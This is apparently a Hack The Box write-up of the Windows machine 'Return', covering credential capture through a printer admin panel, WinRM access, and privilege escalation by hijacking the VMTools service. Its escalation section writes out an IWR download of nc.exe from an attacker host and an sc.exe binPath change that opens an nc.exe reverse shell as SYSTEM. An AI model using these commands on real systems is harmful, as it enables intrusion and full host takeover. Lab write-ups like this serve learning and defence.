---
title: "Hack The Box - Return"
date: 2026-09-10 01:39:00 -0400
categories: [Hack The Box, Windows]
tags: [htb, return, windows, active-directory, iis, burp, service-hijacking, privilege-escalation]
---

# Hack The Box - Return

**Machine:** Return  
**Difficulty:** Medium  
**OS:** Windows  
**Target IP:** 10.129.82.179

## Table of Contents

1. [Introduction](#introduction)
2. [Attack Chain Overview](#attack-chain-overview)
3. [Enumeration](#enumeration)
4. [Initial Access](#initial-access)
5. [Privilege Escalation](#privilege-escalation)
6. [Lessons Learned](#lessons-learned)

## Introduction

Return is a Medium difficulty Windows machine featuring an Active Directory environment with a printer management interface. The attack chain involves intercepting IIS traffic to capture credentials, establishing WinRM access, and leveraging Server Operators group membership to hijack a high-privileged service.

The initial foothold is obtained through a misconfigured printer settings endpoint that accepts user-supplied configuration, which is intercepted and modified in Burp Suite to capture credentials. With `svc-printer` credentials, WinRM access is established.

Privilege escalation is achieved by exploiting the Server Operators group membership to modify the VMTools service binary path, executing a reverse shell as `NT AUTHORITY\SYSTEM`.

## Attack Chain Overview
```bash
10.129.82.179
│
▼
Nmap
│
▼
IIS Printer Admin Panel (Port 80)
│
▼
Index Page
│
▼
Settings Page
│
▼
Burp Suite Interception
│
▼
Listener IP Injection
│
▼
Credentials Captured
│
▼
svc-printer:1edFg43012!!
│
▼
Evil-WinRM Access
│
▼
User Flag
│
▼
Privilege Enumeration
│
▼
Server Operators Group
│
▼
VMTools Service
│
▼
Binary Path Hijacking
│
▼
nc.exe Reverse Shell
│
▼
NT AUTHORITY\SYSTEM
│
▼
Root Flag
```

---

## Enumeration

### Nmap Scanning

Started with a comprehensive port scan:

```bash
nmap -sC -sV 10.129.82.179
```

**Key Ports Discovered:**
```bash
| Port | Service | Details |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS/10.0 - "HTB Printer Admin Panel" |
| 88 | Kerberos | Windows Kerberos |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | Windows netbios-ssn |
| 389 | LDAP | Active Directory LDAP |
| 445 | SMB | Microsoft Windows SMB |
| 464 | Kerberos Password | kpasswd5 |
| 593 | RPC over HTTP | ncacn_http |
| 636 | LDAPS | tcpwrapped |
| 3268 | LDAP GC | Active Directory LDAP (Global Catalog) |
| 3269 | LDAPS GC | tcpwrapped |
| 5985 | WinRM | Microsoft HTTPAPI/2.0 |
```
**Key Finding:** 
- Domain: `return.local`
- Host: PRINTER
- OS: Windows Server (Active Directory environment)

---

## Initial Access

### IIS Printer Admin Panel

Accessed the IIS printer management interface:

http://10.129.82.179/


![Printer Admin Index](/assets/img/01-index-page.jpg)

Navigated to the settings page:

![Settings Page](/assets/img/02-settings-page.jpg)

### Burp Suite Interception

Clicked the "Update" button and intercepted the request in Burp Suite:

![Burp Interception](/assets/img/03-burp-interception.jpg)

The request contained configuration data being sent back to the printer service.

### Credential Capture

Modified the intercepted request to include the listener IP:

ip=10.10.14.60


Forwarded the request and received a connection on the netcat listener:

![Netcat Listener](/assets/img/04-nc-listener.jpg)

**Captured Credentials:**

svc-printer:1edFg43012!!


### Evil-WinRM Access

Established remote shell access using the captured credentials:

```bash
evil-winrm -i 10.129.82.179 -u svc-printer -p '1edFg43012!!'
```

Verified access:

```powershell
whoami
# return\svc-printer
```

### User Flag

Retrieved the user flag:

```powershell
type C:\Users\svc-printer\Desktop\user.txt
```

**User Flag:**

ee2acbf9bf656c80****************


---

## Privilege Escalation

### Privilege Enumeration

Checked available privileges:

```powershell
whoami /priv
```

**Enabled Privileges:**

SeMachineAccountPrivilege Add workstations to domain Enabled
SeLoadDriverPrivilege Load and unload device drivers Enabled
SeSystemtimePrivilege Change the system time Enabled
SeBackupPrivilege Back up files and directories Enabled
SeRestorePrivilege Restore files and directories Enabled
SeShutdownPrivilege Shut down the system Enabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
SeTimeZonePrivilege Change the time zone Enabled


**Key Privileges:** `SeBackupPrivilege`, `SeRestorePrivilege`, `SeLoadDriverPrivilege`

### Group Membership

Checked group membership:

```powershell
whoami /groups
```

**Notable Groups:**

BUILTIN\Print Operators Alias S-1-5-32-550
BUILTIN\Server Operators Alias S-1-5-32-549 ← CRITICAL
BUILTIN\Remote Management Users Alias S-1-5-32-580


**Key Discovery:** Membership in `Server Operators` group allows service modification.

### Services Enumeration

Listed all services to identify privilege escalation vectors:

```powershell
services
```

Identified multiple services with modifiable permissions. **VMTools** stood out as running under `LocalSystem` context.

### VMTools Service Analysis

Confirmed Server Operators control over VMTools:

```powershell
sc.exe sdshow VMTools
```

**Output:** `...;;;SO)` at the end indicates **Server Operators** has full control.

Queried service configuration:

```powershell
sc.exe qc VMTools
```

**Service Details:**

SERVICE_NAME: VMTools
TYPE : 10 WIN32_OWN_PROCESS
START_TYPE : 2 AUTO_START
ERROR_CONTROL : 1 NORMAL
BINARY_PATH_NAME : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
SERVICE_START_NAME : LocalSystem


**Exploitation Path:** Modify `BINARY_PATH_NAME` to execute arbitrary command as `LocalSystem`.

### Downloading nc.exe

Downloaded netcat to the target machine:

```powershell
IWR -UseBasicParsing -Uri 'http://10.10.14.60:8000/nc.exe' -OutFile 'C:\temp\nc.exe'
```

Verified download:

```powershell
dir C:\temp
# -a---- 9/10/2026 12:53 AM 45272 nc.exe
```

### Service Binary Hijacking

Modified the VMTools service binary path to execute nc.exe reverse shell:

```powershell
sc.exe config VMTools binPath="C:\temp\nc.exe -e cmd.exe 10.10.14.60 5566"
```

**Result:**

[SC] ChangeServiceConfig SUCCESS


### Starting Reverse Shell Listener

On the attacking machine, started netcat listener:

```bash
rlwrap -CaR nc -nlvp 5566
```

### Triggering Service Execution

Stopped the VMTools service:

```powershell
sc.exe stop VMTools
```

Started the VMTools service (now executes nc.exe as LocalSystem):

```powershell
sc.exe start VMTools
```

### Reverse Shell Connection

Received reverse shell connection as `NT AUTHORITY\SYSTEM`:

![NT AUTHORITY SYSTEM Shell](/assets/img/05-nt-auth-system.jpg)

Connection received on 10.129.82.179 58753
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system


### Root Flag

Retrieved the administrator flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:**

c61a02f7b3ec950b****************


---

## Lessons Learned

### 1. Interception and Modification

Intercepting network traffic reveals opportunities to inject malicious data. In this case, modifying the listener IP in the printer configuration led to credential capture.

### 2. Group-Based Privilege Escalation

Server Operators group membership is often overlooked but provides significant privilege escalation potential. Always enumerate group memberships before searching for software vulnerabilities.

### 3. Service Binary Path Hijacking

Services running as `LocalSystem` with modifiable binary paths are classic privilege escalation vectors. The Windows Service Control Manager (SC.exe) is a direct tool for exploitation.

### 4. Service Start Types Matter

The `AUTO_START` type on VMTools means the service can be restarted without special privileges. Understanding service configurations is key to reliable exploitation.

### 5. Defense: Active Directory Hardening

Proper service permission configuration prevents this attack. Organizations should:
- Remove non-administrative users from `Server Operators`
- Use Service Principal Names (SPNs) for service identity
- Implement Windows Defender for Advanced Threat Protection (ATP)
- Monitor service modifications via Windows Event Viewer

### 6. Multi-Stage Exploitation

This machine demonstrates multi-stage exploitation:
1. Network interception → Credential capture
2. Service enumeration → Privilege vector identification
3. Binary modification → Privilege escalation
4. Reverse shell execution → System access

---

## Summary

Return demonstrated privilege escalation through group-based service control. Rather than exploiting software vulnerabilities, the attack leveraged overprivileged group membership to modify a service binary path, resulting in code execution as `LocalSystem`.

**Final Chain:** IIS Interception → Credential Capture → WinRM Access → Server Operators → VMTools Hijacking → SYSTEM Shell ✓

---

**Author:** cyberhitman3  
**Date:** September 10, 2026  
**Machine Status:** 🔥 Rooted
